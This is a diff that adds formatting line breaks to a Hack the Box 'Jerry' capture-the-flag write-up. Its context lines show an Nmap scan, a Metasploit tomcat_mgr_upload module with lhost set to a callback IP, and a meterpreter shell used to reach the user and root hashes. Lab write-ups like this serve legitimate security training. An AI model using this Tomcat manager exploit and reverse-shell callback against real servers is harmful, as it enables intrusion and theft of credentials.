@@ -2,6 +2,7 @@
   <img src="https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Jerry/jerry.png" alt="Jerry"/>
 </p>
 
+\
 ## Enumeration
 
 \
@@ -38,6 +39,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 28.45 seconds
 ```
 
+\
 ## Exploitation
 
 \
@@ -61,6 +63,7 @@ msf exploit(tomcat_mgr_upload) > set lhost 10.10.14.232
 lhost => 10.10.14.232
 ```
 
+\
 We got a meterpreter shell on the machine, and from there I was able to navigate to the file containing both the user and root hashes:
 
 ```
